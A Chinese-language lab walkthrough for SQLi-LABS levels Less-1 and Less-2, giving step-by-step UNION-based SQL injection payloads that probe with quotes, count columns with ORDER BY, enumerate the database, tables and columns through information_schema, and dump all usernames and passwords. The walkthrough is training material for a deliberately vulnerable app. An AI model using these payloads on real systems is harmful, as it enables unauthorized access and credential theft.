SQLi-LABS闯关页面

LESS-1 : GET - Error based - Single quotes - String

1.输入 ?id=1 后进行发包。显示登陆成功

2.在 ?id=1 后加一个单引号 ‘ ，报错

3.接下来判断有多少列， ‘ 后面输入order by 1 # ，通过改变行数进行测试，超过列数会报错

4.尝试输入
?id=1’ order by 2 –+
?id=1’ order by 3 –+
……以此类推……
当输入 ?id=1’ order by 4 –+ 报错，说明超出列数

5.接下来进行联合注入第二步：获取数据库中信息：判断数据显示位
输入 ?id=-1’ union select 1,2,3 –+
备注：这里使用-1使union之前的语句查询无结果，则显示的时候就会显示union之后的第二条语句

6.获取数据库中信息：用户、版本、数据库名等
输入?id=-1’ union select version(),user() –+
常用函数：
User() 返回当前数据库用户
Version() 返回当前数据库版本
Database 返回当前使用的数据库名

输入 ?id=-1’ and 1=2 union select 1,database(),3 –+ 查询第二列数据库

7.输入 ?id=-1’ union select 1,2,group_concat(table_name) from information_schema.tables where
table_schema=database() –+ 查询第三个数据库表

8.输入 ?id=-1’ union select 1,2,group_concat(column_name) from information_schema.columns where table_name=”users” –+ 查询uesrs表内容

9.输入?id=-1’ union select 1,(group_concat(username)),(group_concat(password)) from security.users –+
查询所有用户名、密码

LESS-2 : GET - Error based - Intiger based

1.输入 ?id=1 后页面显示登录成功

2.输入 ?id=2-1 后结果与?id=1相同，说明是数字型

3.确定字段位数，输入：
?id=1 order by 1
?id=1 order by 2
?id=1 order by 3
?id=1 order by 4

说明一共有三位

4.输入 ?id=-1 union select 1,2,3 –+ 确认占位信息

5.输入 ?id=-1 union select 1,database(),3 –+ 找到库名

6.输入 ?id=-1 union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=’security’–+ 找到表名

7.输入 ?id=-1 union select 1,2,group_concat(column_name) from information_schema.columns where table_schema=’security’ and table_name=’users’ –+ 找到字段名

8.输入 ?id=-1 union select 1,(group_concat(username)),(group_concat(password)) from security.users –+ 找到账号密码信息
